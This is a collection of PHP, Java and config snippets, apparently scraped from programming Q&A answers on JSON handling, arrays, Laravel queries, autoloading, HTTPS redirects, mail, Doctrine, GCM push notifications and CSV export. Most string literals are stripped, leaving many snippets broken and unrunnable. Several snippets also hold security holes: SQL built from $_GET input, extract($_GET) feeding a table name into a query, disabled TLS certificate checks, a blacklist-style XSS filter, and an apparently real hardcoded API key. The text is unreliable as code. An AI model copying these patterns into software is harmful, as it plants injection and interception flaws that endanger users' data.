use App\Company; public function saveDetailsCompany(Request $request) { $createcompany=Company::create([ echo $createcompany->id; }
if ( $_POST ) { foreach ( $_POST as $key => $value ) { echo "llave: ".$key."- Valor:".$value."<br />"; } }
$string = $_POST[ $var = json_decode($string); echo $var;
$data = json_decode( file_get_contents( var_dump( $data->operation );
$data = json_decode(file_get_contents( var_dump($data);
{ "operacion": { "tok": "[generated token]", "shop_id": "12313", "respuesta": "S", "respuesta_details": "respuesta S", "extended_respuesta_description": "respuesta extendida", "moneda": "PYG", "monto": "10100.00", "authorization_number": "123456", "ticket_number": "123456789123456", "response_code": "00", "response_description": "Transacción aprobada.", "security_information": { "customer_ip": "123.123.123.123", "card_source": "I", "card_country": "Croacia", "version": "0.3", "risk_index": "0" } } }
$data = json_decode(file_get_contents( print_r($data); echo $data["operacion"];
function isValidJSON($str) { json_decode($str); return json_last_error() == JSON_ERROR_NONE; } $json_params = file_get_contents("php: if (strlen($json_params) > 0 && isValidJSON($json_params)) $decoded_params = json_decode($json_params);
require_once dirname(__FILE__) . $mpdf = new \Mpdf\Mpdf(); $mysrcfile = $mydestination = $json = json_encode($_POST); $ch = curl_init($mysrcfile); curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1 ); curl_setopt($ch, CURLOPT_HTTPHEADER, [ curl_setopt($ch, CURLOPT_POSTFIELDS, $json); $html = curl_exec($ch); curl_close($ch); $mpdf->WriteHTML($html); $this->mpdf->Output($mydestination, \Mpdf\Output\Destination::FILE);
Array( [0]=>a [1]=>b [2]=>Array( [0]=>c [1]=>d ) ) Array( [0]=>c [1]=>d )
$a = array( $b = array( $merge = array_merge($a, $b);
$a = array( $b = new ArrayIterator(array( array_push($a, ...$b);
<?php $array1 = array("a" => "JAVA", "b" => "ASP"); $array2 = array("c" => "C", "b" => "PHP"); echo " <br> Example 1 Output: <br>"; print_r(array_merge($array1,$array2)); $array3 =array(5 => "CSS",6 => "CSS3"); $array4 =array(8 => "JAVASCRIPT",9 => "HTML"); echo " <br> Example 2 Output: <br>"; print_r(array_merge($array3,$array4)); $array5 =array(5 => "CSS",6 => "CSS3"); $array6 =array(8 => "JAVASCRIPT",9 => "HTML"); echo " <br> Example 3 Output: <br>"; print_r($array5+$array6); $array7 =array(3 => "CSS",4 => "CSS3"); echo " <br> Example 4 Output: <br>"; print_r(array_merge($array7)); ?>
Example 1 Output: Array ( [a] => JAVA [b] => PHP [c] => C ) Example 2 Output: Array ( [0] => CSS [1] => CSS3 [2] => JAVASCRIPT [3] => HTML ) Example 3 Output: Array ( [5] => CSS [6] => CSS3 [8] => JAVASCRIPT [9] => HTML ) Example 4 Output: Array ( [0] => CSS [1] => CSS3 )
array_merge(array_values($array), array_values($appendArray));
$array1 = array_fill(0,50000, $array2 = array_fill(0,100, $start = microtime(true); $r1 = array_merge($array1, $array2); echo sprintf("Test 1: %.06f\n", microtime(true) - $start); $start = microtime(true); foreach ($array2 as $v) { $array1[] = $v; } echo sprintf("Test 2: %.06f\n", microtime(true) - $start);
$array1 = array_fill(0,50000, $array2 = array_fill(0,50000, $start = microtime(true); $array1 = array_merge($array1, $array2); echo sprintf("Test 1: %.06f\n", microtime(true) - $start); $start = microtime(true); foreach ($array2 as $v) { $array1[] = $v; } echo sprintf("Test 2: %.06f\n", microtime(true) - $start); $start = microtime(true); array_push($array1, ...$array2); echo sprintf("Test 3: %.06f\n", microtime(true) - $start);
$chars = []; for ($i = 0; $i < 15000; $i++) { $chars[] = array_fill(0, 10, } $new = []; $start = microtime(TRUE); foreach ($chars as $splitArray) { $new = array_merge($new, $splitArray); } echo microtime(true) - $start; $new = []; $start = microtime(TRUE); foreach ($chars as $splitArray) { foreach ($splitArray as $value) { $new[] = $value; } } echo microtime(true) - $start;
$products = array(); for($brand_id=1;$brand_id<=3;$brand_id++){ array_merge($products,getByBrand($brand_id)); } print_r($a); for($brand_id=1;$brand_id<=3;$brand_id++){ if(empty($products)){ $products = getByBrand($brand_id); }else{ array_merge($products,getByBrand($brand_id)); } }
<?php $input = urlencode($_GET[ $input = filter_input(INPUT_GET, echo
<?php function xss_clean($data) { $data = str_replace(array( $data = preg_replace( $data = preg_replace( $data = html_entity_decode($data, ENT_COMPAT, $data = preg_replace( $data = preg_replace( $data = preg_replace( $data = preg_replace( $data = preg_replace( $data = preg_replace( $data = preg_replace( $data = preg_replace( do { $old_data = $data; $data = preg_replace( } while ($old_data !== $data); return $data; }
$_GET = filter_input_array(INPUT_GET, FILTER_SANITIZE_STRING); $_POST = filter_input_array(INPUT_POST, FILTER_SANITIZE_STRING); $_REQUEST = (array)$_POST + (array)$_GET + (array)$_REQUEST;
function xssafe($data,$encoding= { return htmlspecialchars($data,ENT_QUOTES | ENT_HTML401,$encoding); } function xecho($data) { echo xssafe($data); }
$dynamicstring = "2490slkj409slk5409els"; $newstring = some_function($dynamicstring); echo "The new string is: " . $newstring;
$newstring = (strlen($dynamicstring)>7)?substr($dynamicstring, -7):$dynamicstring;
Model::where(function ($query) { $query->where( ->orWhere( })->where(function ($query) { $query->where( ->orWhere( });
Model::where(function ($query) use ($a,$b) { $query->where( ->orWhere( }) ->where(function ($query) use ($c,$d) { $query->where( ->orWhere( });
$a = 1; $b = 1; $c = 1; $d = 1; Model::where(function ($query) use ($a, $b) { return $query->where( ->orWhere( })->where(function ($query) use ($c, $d) { return $query->where( ->orWhere( });
$attributes = [ $query->where(function ($query) use ($attributes) { foreach ($attributes as $key=>value) { $query->orWhere($key,$value); } });
->where(function($query) use ($a, $b) { $query->where( ->orWhere( }) ->where(function($query) use ($c, $d) { $query->where( ->orWhere( })
public function scopeNotPaidAt($query, $asAt) { $query = $query->where(function ($query) use ($asAt) { $query->where( }); return $query; }
$a= Coder::where(function ($query) use ($a, $b) { $query->where( ->orWhere( })->where(function ($query) use ($c, $d) { $query->where( ->orWhere( })->get();
$name = $stocks = DB::table( ->select( ->where(function($query) use ($name) { $query->where( ->orWhere( }) ->Where( ->limit(20) ->get();
YourModel::where(function ($query) use($a,$b) { $query->where( ->orWhere( })->where(function ($query) use ($c,$d) { $query->where( ->orWhere( });
foreach (glob("classes/*.php") as $filename) { include $filename; }
$classesDir = array ( ROOT_DIR. ROOT_DIR. ROOT_DIR. ); function __autoload($class_name) { global $classesDir; foreach ($classesDir as $directory) { if (file_exists($directory . $class_name . require_once ($directory . $class_name . return; } } }
function __autoload($class_name) { require_once( } $user = new User();
function include_all_php($folder){ foreach (glob("{$folder}/*.php") as $filename) { include $filename; } } include_all_php("my_classes");
spl_autoload_register( function ($class_name) { $CLASSES_DIR = __DIR__ . DIRECTORY_SEPARATOR . $file = $CLASSES_DIR . $class_name . if( file_exists( $file ) ) include $file; } );
$dir = "classes/"; $dh = opendir($dir); $dir_list = array($dir); while (false !== ($filename = readdir($dh))) { if($filename!="."&&$filename!=".."&&is_dir($dir.$filename)) array_push($dir_list, $dir.$filename."/"); } foreach ($dir_list as $dir) { foreach (glob($dir."*.php") as $filename) require_once $filename; }
$paths = array(); function include_recursive( $path, $debug=false){ foreach( glob( "$path/*") as $filename){ if( strpos( $filename, include_once $filename; if( $debug) echo "<!-- included: $filename -->\n"; } else { $paths[] = $filename; } } for( $i=count($paths)-1; $i>0; $i--){ $path = $paths[$i]; unset( $paths[$i]); include_recursive( $path); } } include_recursive( "tree_to_include"); include_recursive( "tree_to_include",
$directories = array( ); foreach ($directories as $directory) { foreach(glob($directory . "*.php") as $class) { include_once $class; } }
RewriteEngine On RewriteCond %{HTTPS} !=on RewriteRule ^ https:
if (!isset($_SERVER[ if(!headers_sent()) { header("Status: 301 Moved Permanently"); header(sprintf( $_SERVER[ $_SERVER[ )); exit(); } }
function forceHTTPS(){ $httpsURL = if( count( $_POST )>0 ) die( if( !isset( $_SERVER[ if( !headers_sent() ){ header( "Status: 301 Moved Permanently" ); header( "Location: $httpsURL" ); exit(); }else{ die( } } }
RewriteEngine on RewriteCond %{REQUEST_METHOD} !^POST$ RewriteCond %{HTTPS} !=on [OR] RewriteCond %{SERVER_PORT} 80 RewriteCond %{REQUEST_URI} ^something_secure [OR] RewriteCond %{REQUEST_URI} ^something_else_secure RewriteRule .* https: RewriteCond %{HTTPS} =on [OR] RewriteCond %{SERVER_PORT} 443 RewriteCond %{REQUEST_URI} ^something_public [OR] RewriteCond %{REQUEST_URI} ^something_else_public RewriteRule .* http:
RewriteEngine on RewriteCond %{HTTPS}::%{HTTP_HOST} ^off::(?:www\.)?(.+)$ RewriteRule ^ https:
RewriteEngine on RewriteCond %{REQUEST_SCHEME}::%{HTTP_HOST} ^http::(?:www\.)?(.+)$ RewriteRule ^ https:
RewriteEngine On RewriteOptions InheritDownBefore RewriteCond %{HTTPS} !=on RewriteRule ^ https:
RewriteEngine On RewriteBase / RewriteCond %{HTTP:X-HTTPS} !1 RewriteRule ^(.*)$ https:
RewriteEngine On RewriteCond %{HTTPS} off RewriteRule ^(.*)$ https:
RewriteEngine on RewriteCond %{HTTP_HOST} ^(www\.example\.com)(:80)? [NC] RewriteRule ^(.*) https: order deny,allow
RewriteCond %{HTTPS} off RewriteCond %{HTTPS_HOST} !^www.website.com$ [NC] RewriteRule ^(.*)$ https:
SMTP=smtp.gmail.com smtp_port=587 sendmail_from = my-gmail-id@gmail.com sendmail_path = "\"C:\xampp\sendmail\sendmail.exe\" -t"
[sendmail] smtp_server=smtp.gmail.com smtp_port=587 error_logfile=error.log debug_logfile=debug.log auth_username=my-gmail-id@gmail.com auth_password=my-gmail-password force_sender=my-gmail-id@gmail.com
<?php $mail = new PHPMailer(true); if($send_using_gmail){ $mail->IsSMTP(); $mail->SMTPAuth = true; $mail->SMTPSecure = "ssl"; $mail->Host = "smtp.gmail.com"; $mail->Port = 465; $mail->Username = "your-gmail-account@gmail.com"; $mail->Password = "your-gmail-password"; } $mail->AddAddress($email, $name); $mail->SetFrom($email_from, $name_from); $mail->Subject = "My Subject"; $mail->Body = "Mail contents"; try{ $mail->Send(); echo "Success!"; } catch(Exception $e){ echo "Fail :("; } ?>
<?php $to = "somebody@example.com"; $subject = "My subject"; $txt = "Hello world!"; $headers = "From: webmaster@example.com" . "\r\n" . "CC: somebodyelse@example.com"; mail($to,$subject,$txt,$headers); ?>
<?php namespace Acme\CascadeBundle\Entity; use Doctrine\ORM\Mapping as ORM; /** * @ORM\Entity * @ORM\Table(name="child") */ class Child { /** * @ORM\Id * @ORM\Column(type="integer") * @ORM\GeneratedValue(strategy="AUTO") */ private $id; /** * @ORM\ManyToOne(targetEntity="Father", cascade={"remove"}) * * @ORM\JoinColumns({ * @ORM\JoinColumn(name="father_id", referencedColumnName="id") * }) * * @var father */ private $father; }
<?php namespace Acme\CascadeBundle\Entity; use Doctrine\ORM\Mapping as ORM; /** * @ORM\Entity * @ORM\Table(name="father") */ class Father { /** * @ORM\Id * @ORM\Column(type="integer") * @ORM\GeneratedValue(strategy="AUTO") */ private $id; }
@ORM\JoinColumn(name="father_id", referencedColumnName="id", onDelete="CASCADE")
CREATE TABLE contacts (contact_id BIGINT AUTO_INCREMENT NOT NULL, name VARCHAR(75) NOT NULL, PRIMARY KEY(contact_id)) ENGINE = InnoDB; CREATE TABLE phone_numbers (phone_id BIGINT AUTO_INCREMENT NOT NULL, phone_number CHAR(10) NOT NULL, contact_id BIGINT NOT NULL, PRIMARY KEY(phone_id), UNIQUE(phone_number)) ENGINE = InnoDB; ALTER TABLE phone_numbers ADD FOREIGN KEY (contact_id) REFERENCES \ contacts(contact_id) ) ON DELETE CASCADE;
INSERT INTO table contacts(name) VALUES( INSERT INTO table phone_numbers(phone_number, contact_id) VALUES( INSERT INTO table phone_numbers(phone_number, contact_id) VALUES(
<?php namespace Entities; use Doctrine\Common\Collections\ArrayCollection; /** * @Entity * @Table(name="contacts") */ class Contact { /** * @Id * @Column(type="integer", name="contact_id") * @GeneratedValue */ protected $id; /** * @Column(type="string", length="75", unique="true") */ protected $name; /** * @OneToMany(targetEntity="Phonenumber", mappedBy="contact") */ protected $phonenumbers; public function __construct($name=null) { $this->phonenumbers = new ArrayCollection(); if (!is_null($name)) { $this->name = $name; } } public function getId() { return $this->id; } public function setName($name) { $this->name = $name; } public function addPhonenumber(Phonenumber $p) { if (!$this->phonenumbers->contains($p)) { $this->phonenumbers[] = $p; $p->setContact($this); } } public function removePhonenumber(Phonenumber $p) { $this->phonenumbers->remove($p); } } <?php namespace Entities; /** * @Entity * @Table(name="phonenumbers") */ class Phonenumber { /** * @Id * @Column(type="integer", name="phone_id") * @GeneratedValue */ protected $id; /** * @Column(type="string", length="10", unique="true") */ protected $number; /** * @ManyToOne(targetEntity="Contact", inversedBy="phonenumbers") * @JoinColumn(name="contact_id", referencedColumnName="contact_id", onDelete="CASCADE") */ protected $contact; public function __construct($number=null) { if (!is_null($number)) { $this->number = $number; } } public function setPhonenumber($number) { $this->number = $number; } public function setContact(Contact $c) { $this->contact = $c; } } ?> <?php $em = \Doctrine\ORM\EntityManager::create($connectionOptions, $config); $contact = new Contact("John Doe"); $phone1 = new Phonenumber("8173333333"); $phone2 = new Phonenumber("8174444444"); $em->persist($phone1); $em->persist($phone2); $contact->addPhonenumber($phone1); $contact->addPhonenumber($phone2); $em->persist($contact); try { $em->flush(); } catch(Exception $e) { $m = $e->getMessage(); echo $m . "<br />\n"; }
interface IPersonService { public function Create($personObject); } class MySqlPerson implements IPersonService { public function Create($personObject) { } } class MongoPerson implements IPersonService { public function Create($personObject) { } }
new MySqlPerson()->Create($personObject); new MongoPerson()->Create($personObject);
new MySqlPerson()->Create($personObject) new MongoPerson()->Create($personsName, $personsAge);
<?php interface ImportableFeed { public function getEvents(); }
<?php interface ImportableFeed { /** * @return array */ public function getEvents(); }
interface Readable { String read(); } List<Readable> readables; for(Readable reader : readables) System.out.println(reader.read());
interface test{ public function A($i); public function B($j = 20); } class xyz implements test{ public function A($a){ echo "CLASS A Value is ".$a; } public function B($b){ echo "CLASS B Value is ".$b; } } $x = new xyz(); echo $x->A(11); echo "<br/>"; echo $x->B(10);
interface abstract class the code - abstract methods - abstract methods - constants - constants - concrete methods - concrete variables access modifiers - public - public - protected - private etc. number of parents The same class can implement more than 1 interface The child class can inherit only from 1 abstract class
function f(&$v){$v = true;} f(&$v); function f($v){$v = true;} f(&$v);
function f(&$v){$v = true;} $v = array(false,false,false); $r = &$v[1]; f($r);
$data = array( $ids = array( sendPushNotification($data, $ids); function sendPushNotification($data, $ids) { $apiKey = $post = array( ); $headers = array( ); $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($post)); $result = curl_exec($ch); if (curl_errno($ch)) { echo } curl_close($ch); echo $result; }
<?php $apiKey = "your api key"; $registrationIDs = array( "reg id1","reg id2"); $message = "hi Shailesh"; $url = $fields = array( ); $headers = array( ); $ch = curl_init(); curl_setopt( $ch, CURLOPT_URL, $url); curl_setopt( $ch, CURLOPT_POST, true); curl_setopt( $ch, CURLOPT_HTTPHEADER, $headers); curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode( $fields)); $result = curl_exec($ch); curl_close($ch); echo $result; ?>
<?php ini_set( include"Zend/Loader/Autoloader.php"; Zend_Loader_Autoloader::getInstance(); $url = $serverApiKey = "YOUR API KEY AS GENERATED IN API CONSOLE"; $reg = "DEVICE REGISTRATION ID"; $data = array( ); print(json_encode($data)); $client = new Zend_Http_Client($url); $client->setMethod( $client->setHeaders(array("Content-Type" => "application/json", "Authorization" => "key=" . $serverApiKey)); $client->setRawData(json_encode($data)); $request = $client->request( $body = $request->getBody(); $headers = $request->getHeaders(); print("<xmp>"); var_dump($body); var_dump($headers);
<?php require_once require_once $message = new Zend_Mobile_Push_Message_Gcm(); $message->setId(time()); $message->addToken( $message->setData(array( )); $gcm = new Zend_Mobile_Push_Gcm(); $gcm->setApiKey( $response = false; try { $response = $gcm->send($message); } catch (Zend_Mobile_Push_Exception $e) { die($e->getMessage()); } foreach ($response->getResults() as $k => $v) { if ($v[ printf("%s has a new registration id of: %s\r\n", $k, $v[ } if ($v[ printf("%s had an error of: %s\r\n", $k, $v[ } if ($v[ printf("%s was successfully sent the message, message id is: %s", $k, $v[ } }
<?php define("GOOGLE_API_KEY", "AIzaSyCJiVkatisdQ44rEM353PFGbia29mBVscA"); define("GOOGLE_GCM_URL", "https: function send_gcm_notify($reg_id, $message) { $fields = array( ); $headers = array( ); $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, GOOGLE_GCM_URL); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($fields)); $result = curl_exec($ch); if ($result === FALSE) { die( } curl_close($ch); echo $result; } $reg_id = "APA91bHuSGES.....nn5pWrrSz0dV63pg"; $msg = "Google Cloud Messaging working well"; send_gcm_notify($reg_id, $msg);
<?php function sendMessageToPhone($deviceToken, $collapseKey, $messageText, $yourKey) { echo "DeviceToken:".$deviceToken."Key:".$collapseKey."Message:".$messageText ."API Key:".$yourKey."Response"."<br/>"; $headers = array( $data = array( $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, "https: if ($headers) curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_POSTFIELDS, $data); $response = curl_exec($ch); var_dump($response); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if (curl_errno($ch)) { return false; } if ($httpCode != 200) { return false; } curl_close($ch); return $response; } $yourKey = "YOURKEY"; $deviceToken = "REGISTERED_ID"; $collapseKey = "COLLAPSE_KEY"; $messageText = "MESSAGE"; echo sendMessageToPhone($deviceToken, $collapseKey, $messageText, $yourKey); ?>
$gcmClient = new GcmClient( $message = new Message($gcmClient); $message->addRegistrationId( $message->setData([ ]); try { $response = $message->send(); print_r($response); } catch (Exception $exception) { echo }
public class MainActivity extends AppCompatActivity { String PROJECT_NUMBER="your project number/sender id"; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); GCMClientManager pushClientManager = new GCMClientManager(this, PROJECT_NUMBER); pushClientManager.registerIfNeeded(new GCMClientManager.RegistrationCompletedHandler() { @Override public void onSuccess(String registrationId, boolean isNewRegistration) { Log.d("Registration id", registrationId); } @Override public void onFailure(String ex) { super.onFailure(ex); } }); } }
public class GCMClientManager { public static final String TAG = "GCMClientManager"; public static final String EXTRA_MESSAGE = "message"; public static final String PROPERTY_REG_ID = "your sender id"; private static final String PROPERTY_APP_VERSION = "appVersion"; private final static int PLAY_SERVICES_RESOLUTION_REQUEST = 9000; private GoogleCloudMessaging gcm; private String regid; private String projectNumber; private Activity activity; public GCMClientManager(Activity activity, String projectNumber) { this.activity = activity; this.projectNumber = projectNumber; this.gcm = GoogleCloudMessaging.getInstance(activity); } /** * @return Application */ private static int getAppVersion(Context context) { try { PackageInfo packageInfo = context.getPackageManager() .getPackageInfo(context.getPackageName(), 0); return packageInfo.versionCode; } catch (NameNotFoundException e) { throw new RuntimeException("Could not get package name: " + e); } } public void registerIfNeeded(final RegistrationCompletedHandler handler) { if (checkPlayServices()) { regid = getRegistrationId(getContext()); if (regid.isEmpty()) { registerInBackground(handler); } else { Log.i(TAG, regid); handler.onSuccess(regid, false); } } else { Log.i(TAG, "No valid Google Play Services APK found."); } } /** * Registers the application with GCM servers asynchronously. * <p> * Stores the registration ID and app versionCode in the application * shared preferences. */ private void registerInBackground(final RegistrationCompletedHandler handler) { new AsyncTask<Void, Void, String>() { @Override protected String doInBackground(Void... params) { try { if (gcm == null) { gcm = GoogleCloudMessaging.getInstance(getContext()); } InstanceID instanceID = InstanceID.getInstance(getContext()); regid = instanceID.getToken(projectNumber, GoogleCloudMessaging.INSTANCE_ID_SCOPE, null); Log.i(TAG, regid); storeRegistrationId(getContext(), regid); } catch (IOException ex) { handler.onFailure("Error :" + ex.getMessage()); } return regid; } @Override protected void onPostExecute(String regId) { if (regId != null) { handler.onSuccess(regId, true); } } }.execute(null, null, null); } /** * Gets the current registration ID for application on GCM service. * <p> * If result is empty, the app needs to register. * * @return registration ID, or empty string if there is no existing * registration ID. */ private String getRegistrationId(Context context) { final SharedPreferences prefs = getGCMPreferences(context); String registrationId = prefs.getString(PROPERTY_REG_ID, ""); if (registrationId.isEmpty()) { Log.i(TAG, "Registration not found."); return ""; } int registeredVersion = prefs.getInt(PROPERTY_APP_VERSION, Integer.MIN_VALUE); int currentVersion = getAppVersion(context); if (registeredVersion != currentVersion) { Log.i(TAG, "App version changed."); return ""; } return registrationId; } /** * Stores the registration ID and app versionCode in the application * {@code SharedPreferences}. * * @param context application * @param regId registration ID */ private void storeRegistrationId(Context context, String regId) { final SharedPreferences prefs = getGCMPreferences(context); int appVersion = getAppVersion(context); Log.i(TAG, "Saving regId on app version " + appVersion); SharedPreferences.Editor editor = prefs.edit(); editor.putString(PROPERTY_REG_ID, regId); editor.putInt(PROPERTY_APP_VERSION, appVersion); editor.commit(); } private SharedPreferences getGCMPreferences(Context context) { return getContext().getSharedPreferences(context.getPackageName(), Context.MODE_PRIVATE); } /** * Check the device to make sure it has the Google Play Services APK. If * it doesn * the Google Play Store or enable it in the device */ private boolean checkPlayServices() { int resultCode = GooglePlayServicesUtil.isGooglePlayServicesAvailable(getContext()); if (resultCode != ConnectionResult.SUCCESS) { if (GooglePlayServicesUtil.isUserRecoverableError(resultCode)) { GooglePlayServicesUtil.getErrorDialog(resultCode, getActivity(), PLAY_SERVICES_RESOLUTION_REQUEST).show(); } else { Log.i(TAG, "This device is not supported."); } return false; } return true; } private Context getContext() { return activity; } private Activity getActivity() { return activity; } public static abstract class RegistrationCompletedHandler { public abstract void onSuccess(String registrationId, boolean isNewRegistration); public void onFailure(String ex) { Log.e(TAG, ex); } } }
public class PushNotificationService extends GcmListenerService{ public static int MESSAGE_NOTIFICATION_ID = 100; @Override public void onMessageReceived(String from, Bundle data) { String message = data.getString("message"); sendNotification("Hi-"+message, "My App sent you a message"); } private void sendNotification(String title, String body) { Context context = getBaseContext(); NotificationCompat.Builder mBuilder = (NotificationCompat.Builder) new NotificationCompat.Builder(context) .setSmallIcon(R.mipmap.ic_launcher).setContentTitle(title) .setContentText(body); NotificationManager mNotificationManager = (NotificationManager) context .getSystemService(Context.NOTIFICATION_SERVICE); mNotificationManager.notify(MESSAGE_NOTIFICATION_ID, mBuilder.build()); } }
<uses-permission android:name="android.permission.INTERNET" /> <uses-permission android:name="android.permission.WAKE_LOCK" /> <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE" /> <permission android:name="com.example.gcm.permission.C2D_MESSAGE" android:protectionLevel="signature" /> <uses-permission android:name="com.example.gcm.permission.C2D_MESSAGE" /> <application android:allowBackup="true" android:icon="@mipmap/ic_launcher" android:label="@string/app_name" android:supportsRtl="true" android:theme="@style/AppTheme" > <activity android:name=".MainActivity" > <intent-filter> <action android:name="android.intent.action.MAIN" /> <category android:name="android.intent.category.LAUNCHER" /> </intent-filter> </activity> <service android:name=".PushNotificationService" android:exported="false"> <intent-filter> <action android:name="com.google.android.c2dm.intent.RECEIVE" /> </intent-filter> </service> <receiver android:name="com.google.android.gms.gcm.GcmReceiver" android:exported="true" android:permission="com.google.android.c2dm.permission.SEND"> <intent-filter> <action android:name="com.google.android.c2dm.intent.RECEIVE" /> <category android:name="package.gcmdemo" /> </intent-filter> </receiver> </application>
function pnstest(){ $data = array( $url = $server_key = $target = $fields = array(); $fields[ if(is_array($target)){ $fields[ }else{ $fields[ } $headers = array( ); $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($fields)); $result = curl_exec($ch); if ($result === FALSE) { die( } curl_close($ch); return $result; }
<form id="myForm" action="Page_C.php" method="post"> <?php foreach ($_POST as $a => $b) { echo } ?> </form> <script type="text/javascript"> document.getElementById( </script>
/** * Redirect with POST data. * * @param string $url URL. * @param array $post_data POST data. Example: array( * @param array $headers Optional. Extra headers to send. */ public function redirect_post($url, array $data, array $headers = null) { $params = array( ) ); if (!is_null($headers)) { $params[ foreach ($headers as $k => $v) { $params[ } } $ctx = stream_context_create($params); $fp = @fopen($url, if ($fp) { echo @stream_get_contents($fp); die(); } else { throw new Exception("Error loading } }
<form id="paymentForm" method="post" action="https: <input type="hidden" id="customInvoiceId" .... /> <input type="hidden" .... /> <input type="submit" id="submitButton" /> </form>
$( e.preventDefault(); $.getJSON( if (!data.error) { $( $( } });
session_start(); $_SESSION["email"] = "awesome@email.com"; header(
session_start(); echo "<pre>"; print_r($_SESSION); echo "</pre>";
function post(path, params, method) { method = method || "post"; var form = document.createElement("form"); form.setAttribute("method", method); form.setAttribute("action", path); for(var key in params) { if(params.hasOwnProperty(key)) { var hiddenField = document.createElement("input"); hiddenField.setAttribute("type", "hidden"); hiddenField.setAttribute("name", key); hiddenField.setAttribute("value", params[key]); form.appendChild(hiddenField); } } document.body.appendChild(form); form.submit(); }
header("Content-type: text/csv"); header("Content-Disposition: attachment; filename=file.csv"); header("Pragma: no-cache"); header("Expires: 0"); echo "record1,record2,record3\n"; die;
function maybeEncodeCSVField($string) { if(strpos($string, $string = } return $string; }
header("Content-Type: text/csv"); header("Content-Disposition: attachment; filename=file.csv"); function outputCSV($data) { $output = fopen("php: foreach ($data as $row) fputcsv($output, $row); fclose($output); } outputCSV(array( array("name 1", "age 1", "city 1"), array("name 2", "age 2", "city 2"), array("name 3", "age 3", "city 3") ));
function download_csv_results($results, $name = NULL) { if( ! $name) { $name = md5(uniqid() . microtime(TRUE) . mt_rand()). } header( header( header( header("Expires: 0"); $outstream = fopen("php: foreach($results as $result) { fputcsv($outstream, $result); } fclose($outstream); }
<a href="my_csv_creator.php?user=23&amp;othervariable=true">Get CSV</a>
$fname = $fp = fopen($fname, fwrite($fp,$csvdata); fclose($fp); header( header("Content-Disposition: inline; filename=".$fname); readfile($fname);
$query = $pdo->prepare( $query->execute(array($id)); $results = $query->fetchAll(PDO::FETCH_ASSOC); download_csv_results($results, exit(); function download_csv_results($results, $name) { header( header( header( header("Expires: 0"); $outstream = fopen("php: fputcsv($outstream, array_keys($results[0])); foreach($results as $result) { fputcsv($outstream, $result); } fclose($outstream); }
$CSV_string="No,Date,Email,Sender Name,Sender Email \n"; $rand = rand(1,50); $file ="export/export".$rand.".csv"; file_put_contents($file,$CSV_string); /* Or try this code if $CSV_string is an array fh =fopen($file, fputcsv($fh , $CSV_string , "," , "\n" ); fclose($fh); */
<?php header("Content-type: application/csv"); header("Content-Disposition: attachment; filename=file.csv"); header("Pragma: no-cache"); header("Expires: 0"); ini_set( $private=1; error_reporting(E_ALL ^ E_NOTICE); mysql_connect("localhost", "user", "pass") or die(mysql_error()); mysql_select_db("db") or die(mysql_error()); $start = $_GET["start"]; $end = $_GET["end"]; $query = "SELECT * FROM customers WHERE created>= $select_c = mysql_query($query) or die(mysql_error()); while ($row = mysql_fetch_array($select_c, MYSQL_ASSOC)) { $result.="{$row[ $result.="\n"; echo $result; }
$data = array ( $fp = fopen( foreach($data as $line){ $val = explode(",",$line); fputcsv($fp, $val); } fclose($fp);
$list[] = array("Cars", "Planes", "Ships"); $list[] = array("Car header( header( $fp = fopen( fprintf($fp, chr(0xEF).chr(0xBB).chr(0xBF)); foreach ($list as $line) { fputcsv($fp, $line); } fclose($fp);
$csv = new csv(); $csv->load_data(array( array( array( array( )); $csv->send_file(
$query = "SELECT * FROM customers WHERE created>= $select_c = mysql_query($query) or die(mysql_error()); while ($row = mysql_fetch_array($select_c, MYSQL_ASSOC)) { $result.="{$row[ $result.="\n"; echo $result; }
$query = "SELECT * FROM customers WHERE created>= $select_c = mysql_query($query) or die(mysql_error()); while ($row = mysql_fetch_array($select_c, MYSQL_ASSOC)) { echo implode(",", $row)."\n"; }
<?php extract($_GET); header("Content-type: text/csv"); header("Content-Disposition: attachment; filename=$table.csv"); header("Pragma: no-cache"); header("Expires: 0"); require_once("includes/functions.php"); $query = "SHOW columns FROM $table"; $headers = mysql_query($query) or die(mysql_error()); $csv_head = array(); while ($row = mysql_fetch_array($headers, MYSQL_ASSOC)) { $csv_head[] = $row[ } echo implode(",", $csv_head)."\n"; $query = "SELECT * FROM $table"; $select_c = mysql_query($query) or die(mysql_error()); while ($row = mysql_fetch_array($select_c, MYSQL_ASSOC)) { foreach ($row as $key => $value) { if(strpos($value, $row[$key] = } } echo implode(",", $row)."\n"; } ?>
<a href="csv-download.php?table=tbl_vfm"><img title="Download as Excel" src="images/Excel-logo.gif" alt="Download as Excel" /><a/>
